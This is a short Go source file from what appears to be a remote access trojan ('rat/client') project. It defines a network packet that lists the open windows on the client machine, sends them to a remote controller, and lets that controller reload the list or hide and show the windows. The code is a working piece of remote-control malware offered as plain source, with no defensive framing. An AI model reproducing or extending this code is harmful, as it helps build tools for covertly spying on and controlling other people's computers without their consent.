package main

import (
	"rat/client/windows"

	"rat/client/network/header"
)

type WindowsPacket struct {
	Windows []windows.Window `network:"send,receive"`
	Action  int              `network:"receive"`
}

func (packet WindowsPacket) Header() header.PacketHeader {
	return header.WindowsHeader
}

func (packet *WindowsPacket) Init() {
	windows.QueryWindows()

	packet.Windows = windows.Windows
}

func (packet WindowsPacket) OnReceive() error {
	switch packet.Action {
	case windows.Reload:
		Queue <- &WindowsPacket{}
	case windows.Minimize:
		fallthrough
	case windows.Show:
		visible := packet.Action == windows.Show

		for _, window := range packet.Windows {
			windows.SetDisplayState(window.Handle, visible)
		}
	}

	return nil
}
